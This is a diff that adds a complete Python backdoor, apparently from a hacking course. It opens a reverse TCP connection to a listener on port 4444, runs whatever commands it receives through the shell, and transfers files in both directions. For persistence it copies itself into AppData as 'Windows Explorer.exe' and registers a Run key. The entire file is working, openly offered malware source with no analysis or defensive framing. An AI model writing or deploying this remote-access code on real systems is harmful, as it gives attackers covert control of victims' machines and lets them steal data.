@@ -1,0 +1,93 @@
+import socket
+import subprocess
+import json
+import os
+import base64
+import threading
+import time
+import sys
+import shutil # to copy file
+
+#Json Javascript object notation : we use it to convert data structures to string and send over tcp stream.
+class Backdoor:
+    def __init__(self, ip, port):
+        self.become_persistent()
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+        
+    def reliable_send(self, data):
+        json_data = json.dumps(data.decode('latin-1'))
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def execute_system_command(self, command):
+        DEVNULL = open(os.devnull, "wb")
+        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL) # this function can take a string or a list
+
+
+    def change_working_directory(self, path):
+        try:
+            os.chdir(path)
+        except OSError:
+            return "[-] Error , maybe not such a file or directory"
+        return "[+] changing working directory to " + path
+
+    def read_file(self, path):
+        with open(path, "rb" ) as file:
+            encoded_file = base64.b64encode(file.read())
+            print(encoded_file)
+            return encoded_file
+
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            decoded_content = base64.b64decode(content)
+            file.write(decoded_content)
+            return "[+] upload successfull"
+
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location) #first argument is the source file
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
+
+    def run(self):
+        while True:
+            command = self.reliable_receive()  # byte at a time
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    sys.exit()
+
+                elif command[0] == "cd" and len(command) > 1:
+                    output = self.change_working_directory(command[1])
+
+                elif command[0] == "download":
+                    output = self.read_file(command[1])
+
+                elif command[0] == "upload":
+                    output = self.write_file(command[1], command[2])
+
+                else:
+                    output = self.execute_system_command(command)
+            except Exception:
+                output = "[-] Error during command execution"
+
+            self.reliable_send(output)
+
+        self.connection.close()
+
+
+
+try:
+    my_backdoor = Backdoor("127.0.0.1", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit();
